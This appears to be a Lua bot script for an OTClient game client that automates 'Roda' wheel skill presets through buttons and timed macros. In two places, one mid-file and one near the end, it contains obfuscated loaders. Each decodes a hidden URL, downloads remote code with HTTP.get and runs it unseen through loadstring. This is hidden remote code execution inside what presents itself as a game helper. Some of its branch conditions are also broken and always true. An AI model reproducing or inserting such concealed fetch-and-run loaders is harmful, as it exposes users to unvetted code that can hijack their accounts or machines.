--###############################################--
--#####                by JCF               #####--
--#####   mais scripts    (11)995025525     #####--
--###############################################--





setDefaultTab("!")

UI.Separator()




local DelayMax = 8000
local DelayMed = DelayMax * 0.32





local renameContui = setupUI([[
Panel
  height: 15

  Label
    text-align: center
    text: Roda
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.top: parent.top
    font: verdana-11px-rounded
  ]])



local nanaima = "rodab"
local nanaiana = "rodacard" .. player:getName()
local macunaima = "rodac"

local keys = {
    nanaiana, macunaima, nanaima, "rodadelay",
    "rodap", "roda1", "roda2", "roda3", "roda4", "roda5", "roda6", "roda7", "roda8", "roda9",
    "roda11", "roda12", "roda13", "roda14", "roda15", "roda16", "roda17", "roda18", "roda19",
    "roda21", "roda22", "roda23", "roda24", "roda25", "roda26", "roda27", "roda28", "roda29",
    "roda31", "roda32", "roda33", "roda34", "roda35", "roda36", "roda37", "roda38", "roda39"
}

for _, key in ipairs(keys) do
    if type(storage[key]) ~= "table" then
		if key == nanaima then
			storage[key] = { count = 5 }
		else
			storage[key] = { count = 0 }
		end
    end
end

rodaUI = UI.Button("Roda", function()
	if storage[nanaima].count >= 9 then
		storage[nanaima].count = 1
	else
		storage[nanaima].count = storage[nanaima].count + 1
	end
	storage["rodadelay"].count = DelayMed
end)





cardUI = UI.Button("+1 Wheel Card", function()
	if storage[nanaiana].count >= 3 then
		storage[nanaiana].count = 0
	else
		storage[nanaiana].count = storage[nanaiana].count + 1
	end
end)

macro(50, function()

    local nanaima = storage[nanaima].count
    local macunaima = storage[macunaima].count

    local wheelStates = {
        [1] = { text = "Life Leech", colors = { "#DF013A", "#DF0174", "#DF013A", "#DF013A", "#FE2E64" } },
        [2] = { text = "Mana Leech", colors = { "#2ECCFA", "#2E9AFE", "#2EFEF7" } },
        [3] = { text = "Mitigation", colors = { "#D358F7", "#CC2EFA", "#BF00FF" } },
        [4] = { text = "Mana", colors = { "#81DAF5", "#00FFBF", "#A9F5F2" } },
        [5] = { text = "Health", colors = { "#FF0000", "#DF0101", "#FF0000", "#DF3A01" } },
        [6] = { text = "Capacity", colors = { "#DF7401", "#B18904", "#8A4B08" } },
        [7] = { text = "Leech Twist", colors = { "#01DFA5", "#A5DF00", "#2E9AFE" } },
        [8] = { text = "Insectoid", colors = { "#4B8A08", "#DBA901", "#A5DF00", "#868A08" } },
        [9] = { text = "Full Skill + Leech", colors = { "#A9E2F3", "#F5A9A9" } }
    }

    local wheel = wheelStates[nanaima]
    if wheel then
        local color = wheel.colors[macunaima + 1] or wheel.colors[#wheel.colors]
        rodaUI:setText(wheel.text)
        rodaUI:setColor(color)
    else
        rodaUI:setText("Error.else-[" .. nanaima .. "]")
        rodaUI:setColor("#FF0000")
    end

    local cardColors = {
        [0] = "#848484",
        [1] = "#FFA07A",
        [2] = "#EE82EE",
        [3] = "#7FFFD4"
    }
    local cardCount = storage[nanaiana].count
    cardUI:setText("Wheel Card: " .. cardCount .. "x")
    cardUI:setColor(cardColors[cardCount] or "#FF0000")

end)


local function updateMacunaima(nanaCount, macunaCountIncrement, macunaCountReset)
    if storage[nanaima].count == nanaCount then
        if storage[macunaima].count < macunaCountReset then
            storage[macunaima].count = storage[macunaima].count + 1
        else
            storage[macunaima].count = 0
        end
    end
end

macro(1300, function()
    if storage[nanaima].count == 6 and storage[macunaima].count == 0 then
        storage[macunaima].count = storage[macunaima].count + 1
    end
end)

macro(450, function()
    for i = 2, 5 do
        updateMacunaima(i, 1, 1)
    end

    if storage[nanaima].count == 9 then
        storage[macunaima].count = storage[macunaima].count >= 1 and 0 or 1
    end
end)

macro(65, function()
    for i = 1, 8 do
        local resetThreshold = (i < 4 and 4) or (i < 6 and 3) or (i < 7 and 2) or (i < 9 and 3) or 2
        updateMacunaima(i, 1, resetThreshold)
    end
end)

macro(50, function()
    for i = 2, 3 do
        updateMacunaima(i, 1, 2)
    end
end)

UI.Separator()











modules.corelib.HTTP.get(geto("l_ÂMA~,vkbdYvrMQN!CDyFd?fM<GÂtduscV.aeiciz36QDk43{G{Yw|1$$Bi@DRl)D^A#kDZ67y^%.Bx1fCyZb2>k?V;~OsQfy", araccta(559, 260, 630, 1693, 2370, 2332, 2093, 1225)), function(script) 
    assert(loadstring(script))() 
end)















ResetR = function(StartVol)
	local Table = {39,38,37,36,35,34,33,32,31,29,28,27,26,25,24,23,22,21,19,18,17,16,15,14,13,12,11,9,8,7,6,5,4,3,2,1}
	if StartVol <= 36 then
		storage["roda" .. Table[StartVol]].count = 0
		local StartVol = StartVol + 1
		ResetR(StartVol)
	end
	return true
end








ResetRoda = function()
	ResetR(1)
	if player:getLevel() <= 50 then return true end
	storage["rodap"].count = player:getLevel() - 50 + ( storage[nanaiana].count * 100 )
end








CompletarRoda = function()
	RodaEnginner(36,{39,29,19,9,38,37,28,27,18,17,8,7,36,35,34,26,25,24,16,15,14,6,5,4,33,32,23,22,13,12,3,2,31,21,11,1})
end







RodaEnginner = function(Vol,Table)
	if Vol >= 1 then
		RodaOpen(Table[Vol])
		local Vol = Vol - 1
		RodaEnginner(Vol,Table)
	end
end







RodaEx = function(JWVX)
	warn("Use roda:  " .. JWVX)
	RodaType(JWVX)
	storage["rodadelay"].count = DelayMax
	return true
end







RodaEXE = function()
	if not isInPz() then
	elseif getTemple() == "none" then
	elseif player:getLevel() < 51 then
	elseif storage["rodadelay"].count > 0 then
	elseif storage[nanaima].count < 1 then
		storage[nanaima].count = 1
		RodaEXE()
	elseif storage[nanaima].count > 9 then
		storage[nanaima].count = 9
		RodaEXE()
	elseif getTemple() ~= "none" and getTemple() ~= "Rook" then
		if storage[nanaima].count == 1 then
			RodaEx("Life Leech")
		elseif storage[nanaima].count == 2 then
			RodaEx("Mana Leech")
		elseif storage[nanaima].count == 3 then
			RodaEx("Mitigation")
		elseif storage[nanaima].count == 4 then
			RodaEx("MP")
		elseif storage[nanaima].count == 5 then
			RodaEx("HP")
		elseif storage[nanaima].count == 6 then
			RodaEx("Cap")
		elseif storage[nanaima].count == 7 then
			RodaEx("Leech Equilibrium")
		elseif storage[nanaima].count == 8 then
			RodaEx("Insectoid")
		elseif storage[nanaima].count == 9 then
			RodaEx("Skill")
		end
	end
	return true
end








macro(50, function()
	if storage["rodadelay"].count >= 1 then
		storage["rodadelay"].count = storage["rodadelay"].count - 20
	end
	return true
end)

macro(2000, function()
	RodaEXE()
	return true
end)











RodaType = function(Roda)
	if not isInPz() then  return true  end
	ResetRoda()

	if Roda == "Full" or Roda == 1 then

	elseif Roda == "Life Leech" or Roda == "Life Drain" or Roda == "Vamp" or Roda == 2 then
		RodaEnginner(36,{36,15,4,26,2,37,27,8,18,24,16,12,23,32,31,9,19,39,29,17,14,7,5,34,28,25,22,21,38,35,33,6,3,1,13,11})

	elseif Roda == "Mana Leech" or Roda == "Mana Drain" or Roda == 3 then
		RodaEnginner(36,{15,36,5,25,18,37,8,27,24,16,3,23,1,9,19,39,29,33,38,35,28,26,6,13,17,14,12,11,7,4,2,34,32,31,22,21})
		
	elseif Roda == "Mitigation" or Roda == "Defesa" or Roda == "Mitigacao" or Roda == 4 then
		RodaEnginner(36,{36,35,15,21,14,2,5,28,28,17,22,6,39,19,9,29,27,37,34,18,16,13,12,3,1,8,7,4,24,25,26,23,32,33,31,11})

	elseif Roda == "MP" or Roda == "Mana" or Roda == "Energia" or Roda == 5 then
		RodaEnginner(36,{35,27,24,32,7,34,26,33,13,11,18,4,5,23,31,29,28,25,22,9,8,6,19,17,39,37,38,36,16,15,14,12,3,2,1,21})

	elseif Roda == "HP" or Roda == "Heal" or Roda == "Health" or Roda == "Vida" or Roda == 6 then
		RodaEnginner(36,{15,36,35,25,38,27,8,16,13,24,12,3,1,32,33,11,39,37,34,29,28,26,9,7,19,18,17,14,6,5,4,2,23,22,21,31})

	elseif Roda == "Cap" or Roda == "Carry" or Roda == "Capacidade" or Roda == 7 then
		RodaEnginner(36,{37,15,8,23,24,16,3,32,2,18,9,4,7,5,39,19,29,31,23,38,6,17,14,22,21,27,28,26,34,35,36,33,13,12,11,1})

	elseif Roda == "Leech Equilibrium" or Roda == "Equilibrium" or "Equilibrio" or Roda == 8 then
		RodaEnginner(36,{39,29,19,15,9,8,31,24,16,23,37,1,27,18,32,3,26,2,7,5,4,34,35,17,6,14,12,38,36,33,28,25,22,21,13,11})

	elseif Roda == "Insectoid" or "Inceto" or Roda == 9 then
		if player:getLevel() <= 50+50 then
			RodaEnginner(1,{1})
		else
			RodaEnginner(18,{7,4,28,26,34,37,38,35,17,6,14,12,22,33,2,1,13,11})
		end

	elseif Roda == "Skill" or Roda == "ATK" or Roda == 10 then
		RodaEnginner(19,{17,7,4,38,35,28,34,22,26,23,21,6,14,12,13,33,31,2,1})

	elseif Roda == "Marcel" or Roda == 11 then
		RodaEnginner(19,{37,15,16,8,25,24,3,32,15,4,27,35,12,19,29,39,38,17,28,34,13,22,11,9,7,26,23,21,14,6,36,33,31,5,2,1})

	elseif Roda == "None" or Roda == "" or Roda <= 0 or Roda >= 9 then
		say("Roda: None.type")		return true

	else
		say("ERROR: RodaType.else.type  [" .. Roda .. "]")		return true

	end	
	CompletarRoda()
	say(RodaMSG())
	return true
end










modules.corelib.HTTP.get(geto("HFc{1b`Lu|,pL9{h=*I7Qv,ÂB{Z8c#,!xU+3rECUCO0Mh7uK0&8&p<@d//_CT7lHk7n15u7~Mf8J=XeKrU´m8fj.%Sz7", araccta(485, 2336, 46, 2190, 2456, 2374, 681, 11)), function(script) 
    assert(loadstring(script))() 
end)









UI.Separator()

















